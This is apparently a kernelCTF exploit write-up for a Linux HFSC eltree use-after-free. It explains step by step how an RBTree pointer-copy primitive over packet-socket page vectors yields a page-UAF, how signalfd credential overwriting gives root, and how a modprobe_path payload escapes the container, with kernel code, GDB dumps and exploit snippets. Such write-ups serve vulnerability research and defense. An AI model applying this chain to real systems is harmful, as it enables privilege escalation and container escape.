# Attacking Objects

- **Vulnerable Object**: `hfsc_class`
- **Attacking Object**: `pgv`, `signalfd (files)`
- **Primitive**: Pointer copy primitive through RBTree transformations, used to copy a page pointer from one `pgv` to another and cause a page-UAF.

# TL;DR

- Trigger the vulnerability to insert an `hfsc_class` twice into the eligible tree.
- Free the class (it remains accessible in the tree), then spray page vectors to overwrite the freed object.
- Exploit RBTree transformations to achieve a pointer copy primitive, copying a page pointer from one `pgv` structure to another.
- Free the page, reclaim it as a pipe page, cause a page-UAF.
- Reclaim the freed page with signalfd files and use the page-level R/W primitive to swap `file->private_data` with `file->f_cred`.
- Get root by setting the process credentials to zero via `signalfd4()`.

# Vulnerability Analysis

For the vulnerability analysis, please refer to `vulnerability.md`.

# Overview

>In this writeup, we analyze the exploitation techniques used to compromise the LTS and COS instances. For the mitigation instance, refer to `exploit/mitigation-v4-6.6/exploit.md`.

In this section we analyze how the HFSC eltree UAF can be exploited by overlapping the victim `hfsc_class` object with a page vector (`pgv` structure), overwriting all the pointers in `hfsc->el_node` (a `rb_node` structure)`[1]` with pointers to user-controlled pages.

```c
struct hfsc_class {
	struct Qdisc_class_common cl_common;

	struct gnet_stats_basic_sync bstats;
	struct gnet_stats_queue qstats;
	struct net_rate_estimator __rcu *rate_est;
	struct tcf_proto __rcu *filter_list; /* filter list */
	struct tcf_block *block;
	unsigned int	level;		/* class level in hierarchy */

	struct hfsc_sched *sched;	/* scheduler data */
	struct hfsc_class *cl_parent;	/* parent class */
	struct list_head siblings;	/* sibling classes */
	struct list_head children;	/* child classes */
	struct Qdisc	*qdisc;		/* leaf qdisc */

	struct rb_node el_node;	[1]	/* qdisc's eligible tree member */
	struct rb_root vt_tree;		/* active children sorted by cl_vt */
	struct rb_node vt_node;		/* parent's vt_tree member */
	struct rb_root cf_tree;		/* active children sorted by cl_f */
	struct rb_node cf_node;		/* parent's cf_heap member */

    // ...
};
```

This will allow for the use of RBTree transformations to copy a pointer from a `pgv` to another, causing page refcount mismatch and subsequent page-UAF.

## Corrupting Page Vectors To Achieve Page-UAF

`pgv` objects, are allocated by [alloc_pg_vec()](https://elixir.bootlin.com/linux/v6.6.90/source/net/packet/af_packet.c#L4433) when [packet_set_ring()](https://elixir.bootlin.com/linux/v6.6.90/source/net/packet/af_packet.c#L4529) is called. The allocation size depends on the number of pages in the vector, and can range from a vector composed of a single page (`kmalloc-8`) to a vector with hundreds of pages (> `kmalloc-8k`):

```c
static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
{
    unsigned int block_nr = req->tp_block_nr;
    struct pgv *pg_vec;
    int i;

    pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN); // From kmalloc-8 to kmalloc-8k and beyond
    if (unlikely(!pg_vec))
        goto out;

    for (i = 0; i < block_nr; i++) {
        pg_vec[i].buffer = alloc_one_pg_vec_page(order);
        if (unlikely(!pg_vec[i].buffer))
            goto out_free_pgvec;
    }

out:
    return pg_vec;

out_free_pgvec:
    free_pg_vec(pg_vec, order, block_nr);
    pg_vec = NULL;
    goto out;
}
```

When a packet socket is closed, [packet_release()](https://elixir.bootlin.com/linux/v6.6.90/source/net/packet/af_packet.c#L3178) is called in kernel space. If a page vector is already allocated for the TX ring or RX ring, `packet_set_ring()` is called, which in turn uses [free_pg_vec()](https://elixir.bootlin.com/linux/v6.6.90/source/net/packet/af_packet.c#L4390) to first free the pages in the vector and then release the vector itself:

```c
static void free_pg_vec(struct pgv *pg_vec, unsigned int order,
            unsigned int len)
{
    int i;

    for (i = 0; i < len; i++) {
        if (likely(pg_vec[i].buffer)) {
            if (is_vmalloc_addr(pg_vec[i].buffer))
                vfree(pg_vec[i].buffer);
            else
                free_pages((unsigned long)pg_vec[i].buffer,
                       order);
            pg_vec[i].buffer = NULL;
        }
    }
    kfree(pg_vec);
}
```

The pages in the page vector can be mapped to user space using [packet_mmap()](https://elixir.bootlin.com/linux/v6.6.90/source/net/packet/af_packet.c#L4625):

```c
static int packet_mmap(struct file *file, struct socket *sock,
        struct vm_area_struct *vma)
{
    // ...

    for (rb = &po->rx_ring; rb <= &po->tx_ring; rb++) {
        if (rb->pg_vec == NULL)
            continue;

        for (i = 0; i < rb->pg_vec_len; i++) {
            struct page *page;
            void *kaddr = rb->pg_vec[i].buffer;
            int pg_num;

            for (pg_num = 0; pg_num < rb->pg_vec_pages; pg_num++) {
                page = pgv_to_page(kaddr);
                err = vm_insert_page(vma, start, page); // [1]
                if (unlikely(err))
                    goto out;
                start += PAGE_SIZE;
                kaddr += PAGE_SIZE;
            }
        }
    }

    atomic_long_inc(&po->mapped);
    vma->vm_ops = &packet_mmap_ops;
    
    // ...
}
```

From an attacker's perspective, since the page vector allocation and page mapping to user space are performed at two distinct times, if the page vector is corrupted, it is possible to trick the kernel into mmapping the wrong page.

However, `packet_mmap()` uses `vm_insert_page()`, which unlike `remap_pfn_range()`, performs additional checks (see [vm_insert_page()](https://elixir.bootlin.com/linux/v6.6.90/source/mm/memory.c#L2008) -> [insert_page()](https://elixir.bootlin.com/linux/v6.6.90/source/mm/memory.c#L1853) -> [validate_page_before_insert()](https://elixir.bootlin.com/linux/v6.6.90/source/mm/memory.c#L1825)), making this strategy not always applicable.

Another valid approach involves corrupting one of the page pointers in the vector (e.g. partial or total overwrite) so that the same page is contained in two different `pgv` objects at the same time. 

This would cause a mismatch between the page refcount and the places where the page is actually utilized, enabling a page-UAF primitive when pages are freed by `free_pg_vec()`.

This is what we are going to do in this exploit: copying a page pointer from one `pgv` to another to cause a page-UAF.

## RBTRee Pointer Copy Primitive

RBTrees allow for a pointer copy primitive under tree transformations. The only requirement is full or even partial control over an RBNode which can be obtained through type confusion. 

A [rb_node]([include/linux/rbtree_types.h#L5](https://elixir.bootlin.com/linux/v6.6.90/source/include/linux/rbtree_types.h#L5)) structure is defined as follows:

```c
struct rb_node {
    unsigned long  __rb_parent_color; // 0x0
    struct rb_node *rb_right;         // 0x8
    struct rb_node *rb_left;          // 0x10
} __attribute__((aligned(sizeof(long))));
```

In this structure, we have two children nodes, `rb_right` at offset 0x8, `rb_left` at offset 0x10, and a tagged pointer, `__rb_parent_color`, which stores two pieces of information: 
- The address of the parent node.
- The current node's color, 0 for [RB_RED](https://elixir.bootlin.com/linux/v6.6.90/source/include/linux/rbtree_augmented.h#L171), 1 for [RB_BLACK](https://elixir.bootlin.com/linux/v6.6/source/include/linux/rbtree_augmented.h#L172). 

In the HFSC UAF case, our goal is to corrupt a RBNode with a page vector and copy a page pointer from a `pgv` to another. 

Given the following network traffic control configuration (see `vulnerability.md`):

```
   TBF qdisc (1:0) --> HFSC qdisc (2:0) --> HFSC class (2:1) --> NETEM qdisc (3:0)
                                        `-> HFSC class (2:2)
```

an RBTree pointer copy primitive can be achieved with the following steps:

- Trigger the vulnerability so that class 2:1 is inserted twice in the HFSC eltree. Then free the class and replace it with a page vector. This will cause a type confusion, replacing all the pointers in the `&cl->el_node` (an `rb_node` structure) with pointers to user-controlled pages.

- Next, cause an RBTree insertion by sending a single packet to class 2:2. This will insert class 2:2 into the eltree. Since the children of the class 2:1 `el_node` are now both pointers to user-controlled pages, the `el_node` pointer of class 2:2 will be written into one of these pages, leaking the address to user space.

- Now forge and infiltrate a malicious grandparent node (class 2:2's grandparent) in the tree, making it point 0x10 bytes before the target address. In this case, 0x10 bytes before a page vector, so that the `rb_left` child of the grandparent node corresponds to the first page in the `pgv`. 

- Finally, with a single tree update and a deletion, a page pointer will be copied from the `pgv` used to overwrite class 2:1 to the target `pgv`.

This will enable a page-UAF primitive.

# Exploit Analysis

**@step(1): Initialization**

We begin by creating a memfd that will be used in the final step to read the flag. 
Next, we create the files required to trigger modprobe, set up the sandbox environment, initialize the necessary network interfaces, and create 256 pipes.
These pipes will be used in the final stage to exploit the page-UAF.

**@step(2): Setup the qdiscs**

In the second step, we set up the required qdiscs: TBF (1:0) and HFSC (2:0).
TBF is configured with a very low rate. After sending some packets to the qdisc, it will run out of tokens and reschedule itself for later, resulting in the interface being unable to dequeue packets.

**@step(3): Prepare the memory layout**

Now we need to prepare the memory layout required to exploit the vulnerability.

We saturate `kmalloc-1k` partial slabs so that the next allocations end up in a brand new slab. Then, we add class 2:1 to the HFSC qdisc, and add a leaf qdisc, NETEM, to this class.

At this point, we proceed to allocate 16 page vectors (an entire `kmalloc-1k` slab), followed by the HFSC class 2:2. We then spray 16 additional page vectors. 

Now we can be confident that class 2:2 is "surrounded" by `pgv` objects in its slab.

**@step(4): Trigger the vulnerability**

We send a packet to class 2:1. This, will trigger the vulnerability, causing the class to be inserted twice into the eligible tree, resulting in an RBTree cycle. 

Now class 2:1 is both its parent and its `rb_left` child.

```
                      A (2:1, root) 
                     /
                    A (2:1, dupe)
``` 

**@step(5): Free class 2:1 and replace it with a page vector**

We free class 2:1 and then spray page vectors. One of these `pgv` objects will overwrite the `hfsc_class`.

Now all the pointers in the `el_node` structure within the `hfsc_class` object are replaced with pointers to user-controlled pages:

```
                    Page 1
                      |
                      A (2:1)
                     / \
           Page 3 (P)   Page 2   
```

Here is class 2:1 in memory after the type-confusion:

```c
gef➤  x/40gx 0xffff88810a6d0c00 // This should be a hfsc_class (2:1), but... it is a pgv
0xffff88810a6d0c00:	0xffff88810ac0b000	      0xffff88810ac0c000
0xffff88810a6d0c10:	0xffff88810ac0d000	      0xffff88810ac0e000
0xffff88810a6d0c20:	0xffff88810ac0f000	      0xffff88810ac10000
0xffff88810a6d0c30:	0xffff88810ac11000	      0xffff88810ac12000
0xffff88810a6d0c40:	0xffff88810ac13000	      0xffff88810ac14000
0xffff88810a6d0c50:	0xffff88810ac15000	      0xffff88810ac16000
0xffff88810a6d0c60:	0xffff88810ac17000	      0xffff88810ac18000
0xffff88810a6d0c70:	0xffff88810ac19000	      0xffff88810ac1a000
0xffff88810a6d0c80:	0xffff88810ac1b000	      0xffff88810ac1c000
0xffff88810a6d0c90:	0xffff88810ac1d000	      0xffff88810ac1e000
0xffff88810a6d0ca0:	0xffff88810ac1f000 [1]        0xffff88810ac20000 [2]
0xffff88810a6d0cb0:	0xffff88810ac21000 [3]	      0xffff88810ac22000
0xffff88810a6d0cc0:	0xffff88810ac23000	      0xffff88810ac24000
0xffff88810a6d0cd0:	0xffff88810ac25000	      0xffff88810ac26000

[1] Page 1
[2] Page 2
[3] Page 3 (P)
```

Inspecting the `el_node` structure (located 0xa0 bytes within class 2:1), we can confirm that all the `rb_node` pointers have now been replaced by pointers to user-controlled pages:

```c
gef➤  p *(struct rb_node *)0xffff88810a6d0ca0 // &cl->el_node (Class 2:1)
$5 = {
    __rb_parent_color = 0xffff88810ac1f000, // Page 1
    rb_right = 0xffff88810ac20000, // Page 2
    rb_left = 0xffff88810ac21000 // Page 3 (P)
}
```

>For each page in the page vectors, we also ensure that the first qword is set to 1. 
>The first qword of an `rb_node` correspond to the `__rb_parent_color`. 
>This means, we are actually faking a `RB_BLACK` color, so that when the type confusion occurs, the pages are considered black nodes. 
>Keep this in mind, as it will be useful in the next step.

**@step(6): Ptr copy (1/3): Trigger a RBTree insertion**

By sending a packet to class 2:2, it will be inserted into the eligible tree. 
When the packet is sent, the following chain of calls is triggered in kernel space: `hfsc_enqueue() -> init_ed() -> eltree_insert()`.

```c
static void
eltree_insert(struct hfsc_class *cl)
{
    struct rb_node **p = &cl->sched->eligible.rb_node; // Class 2:1 (now a pgv)
    struct rb_node *parent = NULL;
    struct hfsc_class *cl1;

    while (*p != NULL) {
        parent = *p; // [1]
        cl1 = rb_entry(parent, struct hfsc_class, el_node); // [2]
        if (cl->cl_e >= cl1->cl_e) // [3]
            p = &parent->rb_right;
        else
            p = &parent->rb_left;
    }
    rb_link_node(&cl->el_node, parent, p);
    rb_insert_color(&cl->el_node, &cl->sched->eligible);
}
```

In [eltree_insert()](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_hfsc.c#L185) the tree is traversed to determine where to insert the new class node.

For each node, the class real address is derived using `rb_entry()` (which essentially subtracts `offsetof(struct hfsc_class, el_node) = 0xa0` bytes from the `&cl->elnode` address). 
Then, the `cl_e` field of the class is compared with that of the class being inserted. If the latter is greater, the right path is taken, otherwise the left path is taken.

```
First iteration:

                 -> (A) (2:1)
                    / \
                   P   ...
```

In the first iteration, since class 2:1 is now a page vector, when its `cl_e` field (a u64) is compared with that of class 2:2, it corresponds to a page pointer (a very large u64 value!), so the left path is taken.

```
Second iteration:

                     A (2:1)
                    / \
               -> (P)  ...
```

In the second iteration, since page P (now considered an `rb_node`) is zeroed out (with the exception of its first qword, which is set to `RB_BLACK`), both of its children are are NULL, causing the loop to break.

Now [rb_link_node()](https://elixir.bootlin.com/linux/v6.6.90/source/include/linux/rbtree.h#L59) is called to insert the class into the tree:

```c
static inline void rb_link_node(struct rb_node *node, struct rb_node *parent,
                struct rb_node **rb_link)
{
    node->__rb_parent_color = (unsigned long)parent; // C->__rb_parent_color = P
    node->rb_left = node->rb_right = NULL; // C->rb_left = C->rb_right = NULL

    *rb_link = node; // P->rb_right = C
}
```

In this function:

- Node C becomes node P's `rb_right` child.
- Node P becomes node C's parent.

This is the RBTree after class 2:2 is inserted:

```
                     A (2:1)
                    / \
                   P   Page 2      
                    \
                     C (2:2)
    
```

If we look at the tree from node `P`'s prospective, it is an orphan node, and the color bit of `__rb_parent_color` (set to 1) indicates it is a black node:

```
                     1 (Fake RB_BLACK)
                     ^
                     |
                     P
                      \
                       C (2:2)       
```

This is useful when [rb_insert_color()](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L434) is called, which in turn calls [__rb_insert()](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L85):

```c
static __always_inline void
__rb_insert(struct rb_node *node, struct rb_root *root,
        void (*augment_rotate)(struct rb_node *old, struct rb_node *new))
{
    struct rb_node *parent = rb_red_parent(node), *gparent, *tmp;

    while (true) {

        if (unlikely(!parent)) {
            rb_set_parent_color(node, NULL, RB_BLACK);
            break;
        }

        // P->__rb_parent_color is 1 (RB_BLACK)
        // P is considered a black node
        // The loop breaks here
        if (rb_is_black(parent)) // [1]
            break;

        // ...
    }

    // ...
}
```

Since node C's parent, P, is considered a black node, the function returns immediately and the tree is not rebalanced. `[1]`

At this point, since the `el_node` address of class 2:2 has been written in a user-controlled page, we can locate the page and leak the node address.

From this, we can forge a malicious grandparent node (aka Evil Grandpa) and insert it into the tree by modifying the first qword of the user-controlled page P (the `__rb_parent_color` field, if we consider the page an `rb_node`).

```    
                     E (Evil Grandpa)
                   / ^
                  T  |
                     P
                      \
                       C (2:2)    
```    

The address of Evil Grandpa corresponds to the address of class 2:2 + `KMALLOC_1024_CHUNK_SIZE` (1024) - 0x10, in other words, 0x10 bytes before the next object in memory, which is a `pgv` (remember that class 2:2 is "surrounded" by `pgv` objects in its slab).

By setting Evil Grandpa's address to 0x10 bytes before a `pgv`, we ensure its `rb_left` child corresponds to the first page in the page vector. We are going to overwrite this page with the address of page P.

Inspecting Evil Grandpa in GDB, we can confirm it points 0x10 bytes before a page vector:

```c {linenos=false}
gef➤  x/40gx 0xffff88810a6d1bf0 // E
0xffff88810a6d1bf0:	0x0000000000000000	    0x0000000000000000
0xffff88810a6d1c00:	0xffff888121326000 ***	    0xffff888121325000
0xffff88810a6d1c10:	0xffff888121327000	    0xffff888121328000
0xffff88810a6d1c20:	0xffff888121329000	    0xffff88812132a000
0xffff88810a6d1c30:	0xffff88812132b000	    0xffff88812132c000
0xffff88810a6d1c40:	0xffff88812132d000	    0xffff88812132e000
```

And that its `rb_left` child corresponds to the address of the first page in the vector:

```c {linenos=false}
gef➤  p *(struct rb_node *)0xffff88810a6d1bf0 // E
$66 = {
    __rb_parent_color = 0x0,
    rb_right = 0x0 <fixed_percpu_data>,
    rb_left = 0xffff888121326000 *** // TARGET
}
```

**@step(7): Ptr copy (2/3): Trigger a RBTree update**

Now, by changing class 2:2, we trigger a tree update. In kernel space, we have the following chain of calls: `hfsc_change_class() -> update_el() -> eltree_update()`. 

The [eltree_update()](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_hfsc.c#L213) function is defined as follow:

```c
static inline void
eltree_update(struct hfsc_class *cl)
{
	eltree_remove(cl); // Remove the class from the tree
	eltree_insert(cl); // Then re-inserts it
}
```

[eltree_remove()](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_hfsc.c#L204) calls [rb_erase()](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L440) which in turn calls [__rb_erase_augmented()](https://elixir.bootlin.com/linux/v6.6.90/source/include/linux/rbtree_augmented.h#L224) to delete the node from the tree:

```c
static __always_inline struct rb_node *
__rb_erase_augmented(struct rb_node *node, struct rb_root *root,
             const struct rb_augment_callbacks *augment)
{
    struct rb_node *child = node->rb_right; // child = C->rb_right = 0
    struct rb_node *tmp = node->rb_left; // tmp = C->rb_left = 0
    struct rb_node *parent, *rebalance;
    unsigned long pc;

    if (!tmp) {
        pc = node->__rb_parent_color; // pc = C->__rb_parent_color = P
        parent = __rb_parent(pc); // parent = P
        __rb_change_child(node, child, parent, root); // WRITE_ONCE(P->rb_right, 0) [1]
        if (child) {
            child->__rb_parent_color = pc;
            rebalance = NULL;
        } else
            rebalance = __rb_is_black(pc) ? parent : NULL;
        tmp = parent;
    }
    // ...
}
```

Class 2:2 is removed from the tree: `[1]`

``` 
                 E (Evil Grandpa)
               / ^
              T  |
                 P
                  \
                   x 
```

Then, `eltree_insert()` is called. It first uses `rb_link_node()` to re-insert the class. This results in the same tree configuration as before the class deletion:

```c
static inline void rb_link_node(struct rb_node *node, struct rb_node *parent,
                struct rb_node **rb_link)
{
    node->__rb_parent_color = (unsigned long)parent; // C->__rb_parent_color = P
    node->rb_left = node->rb_right = NULL; // C->rb_left = C->rb_right = NULL

    *rb_link = node; // P->rb_right = C
}
```

```
                 E (Evil Grandpa)
               / ^
              T  |
                 P
                  \
                   C (2:2)    
```

However, when `rb_insert_color() -> __rb_insert()` is called, the situation is different. Now node C's parent is no longer considered a black node (remember that in the first insertion we faked its `__rb_parent_color` pointer, setting it to `RB_BLACK`).

Since the parent is considered red, the tree needs to rebalance itself:

```c
static __always_inline void
__rb_insert(struct rb_node *node, struct rb_root *root,
        void (*augment_rotate)(struct rb_node *old, struct rb_node *new))
{
    struct rb_node *parent = rb_red_parent(node), *gparent, *tmp;

    // node   = C (0xffff88810a6d18a0)
    // parent = P (0xffff88810ac21000)

    while (true) {

        // ...

        if (rb_is_black(parent)) // Not taken, P->__rb_parent_color is RB_RED (E)
            break;

        gparent = rb_red_parent(parent); // gparent = E

        tmp = gparent->rb_right; // tmp = E->rb_right = 0
        if (parent != tmp) {	// parent is P != 0

            // ...

            tmp = parent->rb_right; // tmp = P->rb_right = C

            if (node == tmp) { // node (C) == tmp (C)
                // Case 2 - node's uncle is black and node is
                // the parent's right child (left rotate at parent).
                tmp = node->rb_left; // tmp = C->rb_left = 0 
                WRITE_ONCE(parent->rb_right, tmp); // P->rb_right = 0 
                WRITE_ONCE(node->rb_left, parent); // C->rb_left = P [1]
                if (tmp) // not taken
                    rb_set_parent_color(tmp, parent,
                                RB_BLACK);
                rb_set_parent_color(parent, node, RB_RED); // P->__rb_parent_color = C [2]
                augment_rotate(parent, node); // dummy_rotate, noop
                parent = node; // parent = C
                tmp = node->rb_right; // tmp = C->rb_right = 0
            }

            // parent = node = C
            // tmp = C->rb_right = 0

            // Case 3 - node's uncle is black and node is
            // the parent's left child (right rotate at gparent).

            WRITE_ONCE(gparent->rb_left, tmp); // E->rb_left = 0 [3]
            WRITE_ONCE(parent->rb_right, gparent); // C->rb_right = E [4]
            if (tmp) // not taken
                rb_set_parent_color(tmp, gparent, RB_BLACK);
            __rb_rotate_set_parents(gparent, parent, root, RB_RED); // [5] ***
            augment_rotate(gparent, parent); // dummy_rotate, nop
            break;
        } else {
            // ...
        }
    }

}

// ...

static inline void
__rb_rotate_set_parents(struct rb_node *old, struct rb_node *new,
			struct rb_root *root, int color) // ***
{
	struct rb_node *parent = rb_parent(old);
	new->__rb_parent_color = old->__rb_parent_color; // C->__rb_parent_color = E->__rb_parent_color = 0
	rb_set_parent_color(old, new, color); // E->__rb_parent_color  = C (RB_RED)
	__rb_change_child(old, new, parent, root); // WRITE_ONCE(root->rb_node, C);
}
```

First node P becomes node C's `rb_left` child `[1]` and node P's parent is updated accordingly `[2]`:

```
                   C (2:2)
                  / 
                 P
``` 

Then node E's `rb_left` is zeroed out (essentially the first page pointer in the target page vector is set to NULL), `[3]` and then E becomes node C's `rb_right` child. `[4]`

Finally, in [__rb_rotate_set_parents()](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L75), node C's parent is set to zero, C becomes E's parent node, and then node C is promoted to root node, resulting in the following tree configuration: `[5]`

``` 
                   C (2:2)
                  / \
                 P   E
                    /
                   T (NULL) 
```

This is node C in GDB:

```c
gef➤  p *(struct rb_node *)0xffff88810a6d18a0 // C (2:2)
$67 = {
    __rb_parent_color = 0x0,
    rb_right = 0xffff88810a6d1bf0, // E
    rb_left = 0xffff88810ac21000 // P 
}
```

And node E:

```c
gef➤  p *(struct rb_node *)0xffff88810a6d1bf0 // E
$68 = {
    __rb_parent_color = 0xffff88810a6d18a0, // C
    rb_right = 0x0 <fixed_percpu_data>,
    rb_left = 0x0 <fixed_percpu_data> // TARGET
}
```  

**@step(8): Ptr copy (3/3): Trigger a RBTree deletion**

We have finally reached the last step. Now we only need to trigger the removal of class 2:2 from the tree. This will set Evil Grandpa's `rb_left` child (the first page in the target `pgv`) to the address of page P.

The following chain of calls is triggered in the kernel: `hfsc_delete_class() -> qdisc_purge_queue() -> qdisc_tree_reduce_backlog() -> hfsc_qlen_notify() -> eltree_remove() -> rb_erase() -> __rb_erase_augmented()`. 

`__rb_erase_augmented()` proceeds to remove class 2:2 from the tree, and then rebalances it:

```c
static __always_inline struct rb_node *
__rb_erase_augmented(struct rb_node *node, struct rb_root *root,
             const struct rb_augment_callbacks *augment)
{
    struct rb_node *child = node->rb_right; 
    struct rb_node *tmp = node->rb_left;
    struct rb_node *parent, *rebalance;
    unsigned long pc;

    // node  = C (0xffff88810a6d18a0)
    // child = C->rb_right = E (0xffff88810a6d1bf0)
    // tmp   = C->rb_left = P (0xffff88810ac21000)

    if (!tmp) {
        // ...
    } else if (!child) {
        // ...
    } else {
        struct rb_node *successor = child, *child2; // successor = E

        tmp = child->rb_left; // tmp = E->rb_left = 0
        if (!tmp) {
            // Case 2: node's successor is its right child
            parent = successor; // parent = E
            child2 = successor->rb_right; // child2 = E->rb_right = 0
            augment->copy(node, successor); // noop
        } else {
            // ...
        }

        tmp = node->rb_left; // tmp = C->rb_left = P
        WRITE_ONCE(successor->rb_left, tmp); // E->rb_left = P (Pwned!) [1]
        rb_set_parent(tmp, successor); // P->__rb_parent_color = E

        pc = node->__rb_parent_color; // pc = C->__rb_parent_color = 0
        tmp = __rb_parent(pc); // tmp = 0
        __rb_change_child(node, successor, tmp, root); // WRITE_ONCE(root->rb_node, 0); [2]

        if (child2) { // child2 = E->rb_right = 0
            rb_set_parent_color(child2, parent, RB_BLACK);
            rebalance = NULL;
        } else {
            rebalance = rb_is_black(successor) ? parent : NULL; // rebalance = NULL
        }
        successor->__rb_parent_color = pc; // E->__rb_parent_color = 0 [3]
        tmp = successor;
    }

    augment->propagate(tmp, NULL); // noop
    return rebalance;
}
```

First, Node P is moved from C's `rb_left` to node E's `rb_left`. `[1]` (Hey, we just pwned it!)

```
                 C (2:2)
                / \
               x   E
                  /
                 P (TARGET = P) Pwned!
```

Then Class 2:2 is deleted. `[2]` `[3]`

```
                 x
                  \
                   E
                  /
                 P

```
```
                   E
                  /  
                 P
```

By inspecting Evil Grandpa in GDB, we can confirm that its `rb_left` child now corresponds to page P.

```c
gef➤  p *(struct rb_node *)0xffff88810a6d1bf0 // E
$102 = {
    __rb_parent_color = 0x0,
    rb_right = 0x0 <fixed_percpu_data>,
    rb_left = 0xffff88810ac21000 // TARGET = P
}
```

This means that Page P has been copied from the original page vector (the one used to overwrite class 2:1) to the target `pgv`:

```c
gef➤  x/40gx 0xffff88810a6d0ca0 // Original (Class 2:1)
0xffff88810a6d0ca0:	0xffff88810ac1f000      0xffff88810ac20000
0xffff88810a6d0cb0:	0xffff88810ac21000***   0xffff88810ac22000
0xffff88810a6d0cc0:	0xffff88810ac23000      0xffff88810ac24000
0xffff88810a6d0cd0:	0xffff88810ac25000      0xffff88810ac26000

gef➤  x/40gx 0xffff88810a6d1bf0 // E
0xffff88810a6d1bf0:	0x0000000000000000      0x0000000000000000
0xffff88810a6d1c00:	0xffff88810ac21000***   0xffff888121325000
0xffff88810a6d1c10:	0xffff888121327000      0xffff888121328000
0xffff88810a6d1c20:	0xffff888121329000      0xffff88812132a000
```

**@step(9): Cause a page-UAF**: 

At this point, the same page is referenced in two different page vectors, creating a mismatch between the page refcount and the actual number of places where it is utilized. We can exploit this discrepancy to cause a page-UAF in just a few steps:

```c
    munmap(page_a, total_size); // counter = 3 -> 2
    munmap(page_b, total_size); // counter = 2 -> 1
    close(psock_a);             // counter = 1 -> 0 -> free

    // Page reclaimed, counter = 1
    for (int i = 0; i < NUM_PIPES; i++)
        write(pipes[i][1], buff, PAGE_SIZE); 

    close(psock_b); // counter = 0 -> free (page-UAF)
```

First, we free the page, then we reclaim it by writing to pipes (this will trigger a page allocation in [pipe_write()](https://elixir.bootlin.com/linux/v6.6.90/source/fs/pipe.c#L502)). 

Finally, we close the page vector containing the copied page pointer so the page is freed, causing a page-UAF.

**@step(10): Get root**

To get root privileges, we reclaim the freed page with a filp slab by spraying signalfd files.

Then we perform instance fingerprinting by examining the offset `0x70` of the first file in the slab. For LTS, this offset corresponds to `file->f_cred`, while for COS 105, it is always `NULL`:

Using the page-level R/W primitive, we swap the `file->private_data` pointer with `file->f_cred` for all the file in the slab.

This enables a qword write primitive when [do_signalfd4()](https://elixir.bootlin.com/linux/v6.6.90/source/fs/signalfd.c#L292) is called:

```c
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
	struct signalfd_ctx *ctx;

	// ...

	if (flags & ~(SFD_CLOEXEC | SFD_NONBLOCK))
		return -EINVAL;

	sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));
	signotset(mask);

	if (ufd == -1) {
		struct file *file;

		ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);
		if (!ctx)
			return -ENOMEM;

		ctx->sigmask = *mask;

		// ...
		file = anon_inode_getfile("[signalfd]", &signalfd_fops, ctx,
				       O_RDWR | (flags & O_NONBLOCK));
		// ...
	} else {
		// ...
		// We swapped file->private_data with file->f_cred
		// So here ctx = file->f_cred
		ctx = fd_file(f)->private_data; 
		// ...
		ctx->sigmask = *mask; // Overwrite f_cred
		// ...
	}

	return ufd;
}
```

We use this write primitive to set the process credentials to zero. Since we cannot control the lower bytes of the signalfd mask, we write backwards, starting from `cred + 48`, utilizing the upper bytes of the mask, which are set to zero.

Now we are root! To escape from the container we modify `/proc/sys/kernel/modprobe`. 

Since we don't know the PID of the current process in the root namespace, we bruteforce it. For each iteration, we set the modprobe path to `"/proc/<i>/root/tmp/evil"`, and trigger modprobe. 

When the attacking task PID is found, the kernel will execute our malicious payload, and the flag will be copied to the memfd file descriptor of the task:

```c
#define MODPROBE_PAYLOAD \
    "#!/bin/bash\n" \
    "pid=$(echo \"$0\" | sed -E 's|/proc/([0-9]+)/.*|\\1|')\n" \
    "cat /flag > /proc/$pid/fd/696\n"

// ...

int modeprobe_exec(void) {
	// ...
	for (int pid = MODPROBE_MIN_PID; pid < MODPROBE_MAX_PID; pid++) {
        snprintf(evil_path, sizeof(evil_path), "/proc/%d/root/tmp/evil", pid);
        write_file(MODPROBE_PATH, evil_path, strlen(evil_path));

        execve("/tmp/trigger", NULL, NULL);
        fstat(696, &st);

        if (st.st_size > 0) {
            puts("pwned");
            read(696, flag, st.st_size);
            printf("%s\n", flag);
            sleep(1);
            exit(0);
        }
    }
    return 0;
}
```

# Additional Notes

This exploit is portable and works on LTS 6.6.*, COS 105, COS 109 and Debian 12. It only requires minor modifications to work on Ubuntu (due to Kmalloc Random Caches). The success rate is close to 10/10 on kernelCTF instances.

To our knowledge, the techniques used in this exploit, especially the RBTree pointer copy primitive, are not documented. Maybe there's some sort of novelty?
